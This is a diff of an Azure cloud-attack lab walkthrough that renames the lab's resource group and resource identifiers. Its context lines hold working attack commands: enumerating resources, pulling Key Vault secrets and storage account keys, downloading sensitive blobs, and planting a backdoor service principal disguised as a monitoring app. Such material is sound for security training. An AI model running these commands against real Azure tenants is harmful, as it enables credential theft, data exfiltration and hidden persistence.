@@ -9,7 +9,7 @@
 ## 1.1 Resource Enumeration
 
 ```bash
-az resource list --resource-group SeasidesTraining 
+az resource list --resource-group HTB-mumbai 
 --output table
 ```
 
@@ -18,7 +18,7 @@ az resource list --resource-group SeasidesTraining
 ## 1.2 Key Vault Discovery
 
 ```bash
-az keyvault list --resource-group SeasidesTraining
+az keyvault list --resource-group HTB-mumbai
 ```
 
 ![alt text](images/image-2.png)
@@ -26,7 +26,7 @@ az keyvault list --resource-group SeasidesTraining
 ## 1.3 Storage Account Enumeration
 
 ```bash
-az storage account list --resource-group SeasidesTraining
+az storage account list --resource-group HTB-mumbai
 ```
 
 ![alt text](images/image-3.png)
@@ -34,7 +34,7 @@ az storage account list --resource-group SeasidesTraining
 ## 1.4 Virtual Machine Enumeration
 
 ```bash
-az vm list --resource-group SeasidesTraining --show-details
+az vm list --resource-group HTB-mumbai --show-details
 ```
 
 ![alt text](images/image-4.png)
@@ -42,7 +42,7 @@ az vm list --resource-group SeasidesTraining --show-details
 ## 1.5 Managed Identity Enumeration
 
 ```bash
-az identity list --resource-group SeasidesTraining
+az identity list --resource-group HTB-mumbai
 ```
 
 ![alt text](images/image-5.png)
@@ -61,7 +61,7 @@ az network nsg rule list --nsg-name vulnerable-nsg
 **Corrected Command**
 
 ```bash
-az network nsg rule list --resource-group SeasidesTraining --nsg-name vulnerable-nsg
+az network nsg rule list --resource-group HTB-mumbai --nsg-name vulnerable-nsg
 ```
 
 ![alt text](images/image-7.png)
@@ -73,7 +73,7 @@ az network nsg rule list --resource-group SeasidesTraining --nsg-name vulnerable
 ## 2.1 Secret Enumeration
 
 ```bash
-az keyvault secret list --vault-name kv-vuln-4zdn0r --output table
+az keyvault secret list --vault-name kv-vuln-b3hrxj --output table
 ```
 
 ![alt text](images/image-8.png)
@@ -81,10 +81,10 @@ az keyvault secret list --vault-name kv-vuln-4zdn0r --output table
 ## 2.2 Secret Exfiltration
 
 ```bash
-DB_PASSWORD=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name db-password --query value -o tsv)
-API_KEY=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name api-key --query value -o tsv)
-SP_CLIENT_ID=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name service-principal-client-id --query value -o tsv)
-SP_SECRET=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name service-principal-secret --query value -o tsv)
+DB_PASSWORD=$(az keyvault secret show --vault-name kv-vuln-b3hrxj --name db-password --query value -o tsv)
+API_KEY=$(az keyvault secret show --vault-name kv-vuln-b3hrxj --name api-key --query value -o tsv)
+SP_CLIENT_ID=$(az keyvault secret show --vault-name kv-vuln-b3hrxj --name service-principal-client-id --query value -o tsv)
+SP_SECRET=$(az keyvault secret show --vault-name kv-vuln-b3hrxj --name service-principal-secret --query value -o tsv)
 ```
 
 ![alt text](images/image-9.png)
@@ -116,7 +116,7 @@ Authentication failed due to missing role assignment at the resource group scope
 
 **Corrective Administrative Action**
 
-1. Navigate to Resource Groups → SeasidesTraining
+1. Navigate to Resource Groups → HTB-mumbai
 2. Open Access control (IAM)
 3. Select + Add → Add role assignment
 4. Choose Contributor role
@@ -151,7 +151,7 @@ az role assignment list --all --output table
 ![alt text](images/image-15.png)
 
 ```bash
-az resource list --resource-group SeasidesTraining 
+az resource list --resource-group HTB-mumbai 
 ```
 
 ![alt text](images/image-16.png)
@@ -165,7 +165,7 @@ az resource list --resource-group SeasidesTraining
 ```bash
 #Direct download - NO AUTH REQUIRED!
 curl -o "confidential.txt" \
-  "https://stvuln4zdn0r.blob.core.windows.net/sensitive-data/confidential.txt"
+  "https://stvulnb3hrxj.blob.core.windows.net/sensitive-data/confidential.txt"
 ```
 
 ![alt text](images/image-17.png)
@@ -173,7 +173,7 @@ curl -o "confidential.txt" \
 
 ```bash
 curl -o "customers.csv" \
-  "https://stvuln4zdn0r.blob.core.windows.net/sensitive-data/customers.csv"
+  "https://stvulnb3hrxj.blob.core.windows.net/sensitive-data/customers.csv"
 ```
 
 ![alt text](images/image-19.png)
@@ -182,12 +182,12 @@ curl -o "customers.csv" \
 
 ```bash
 STORAGE_KEY=$(az storage account keys list \
-  --resource-group SeasidesTraining \
-  --account-name stvuln4zdn0r \
+  --resource-group HTB-mumbai \
+  --account-name stvulnb3hrxj \
   --query [0].value -o tsv)
 
 az storage blob list \
-  --account-name stvuln4zdn0r \
+  --account-name stvulnb3hrxj \
   --container-name sensitive-data \
   --account-key $STORAGE_KEY
 ```
@@ -196,7 +196,7 @@ az storage blob list \
 
 ```bash
 az storage blob download \
-  --account-name stvuln4zdn0r \
+  --account-name stvulnb3hrxj \
   --container-name sensitive-data \
   --name confidential.txt \
   --file exfiltrated-confidential.txt \
@@ -212,7 +212,7 @@ az storage blob download \
 ## 5.1 Public IP Identification
 
 ```bash
-az vm list-ip-addresses --resource-group SeasidesTraining
+az vm list-ip-addresses --resource-group HTB-mumbai
 ```
 
 ![alt text](images/image-37.png)
@@ -275,12 +275,12 @@ $kvToken = (Invoke-RestMethod `
 # Access secrets
 $headers = @{Authorization = "Bearer $kvToken"}
 Invoke-RestMethod `
-  -Uri 'https://kv-vuln-4zdn0r.vault.azure.net/secrets?api-version=7.4' `
+  -Uri 'https://kv-vuln-b3hrxj.vault.azure.net/secrets?api-version=7.4' `
   -Headers $headers
 
 # Get specific secret
 Invoke-RestMethod `
-  -Uri 'https://kv-vuln-4zdn0r.vault.azure.net/secrets/db-password?api-version=7.4' `
+  -Uri 'https://kv-vuln-b3hrxj.vault.azure.net/secrets/db-password?api-version=7.4' `
   -Headers $headers
 ```
 
@@ -294,7 +294,7 @@ Invoke-RestMethod `
 
 ```bash
 LOGIC_APP_URL=$(az rest --method post \
-  --uri "https://management.azure.com/subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/SeasidesTraining/providers/Microsoft.Logic/workflows/vulnerable-workflow/triggers/manual/listCallbackUrl?api-version=2016-06-01" \
+  --uri "https://management.azure.com/subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/HTB-mumbai/providers/Microsoft.Logic/workflows/vulnerable-workflow/triggers/manual/listCallbackUrl?api-version=2016-06-01" \
   --query value -o tsv)
 ```
 
@@ -336,7 +336,7 @@ done
 BACKDOOR_SP=$(az ad sp create-for-rbac \
   --name "legitimate-monitoring-app" \
   --role Contributor \
-  --scopes /subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/SeasidesTraining)
+  --scopes /subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/HTB-mumbai)
 
 BACKDOOR_APP_ID=$(echo $BACKDOOR_SP | jq -r '.appId')
 BACKDOOR_PASSWORD=$(echo $BACKDOOR_SP | jq -r '.password')
@@ -349,7 +349,7 @@ BACKDOOR_STORAGE="legitlogs$RANDOM"
  
 az storage account create \
   --name $BACKDOOR_STORAGE \
-  --resource-group SeasidesTraining \
+  --resource-group HTB-mumbai \
   --location "Central India" \
   --sku Standard_LRS \
   --allow-blob-public-access true
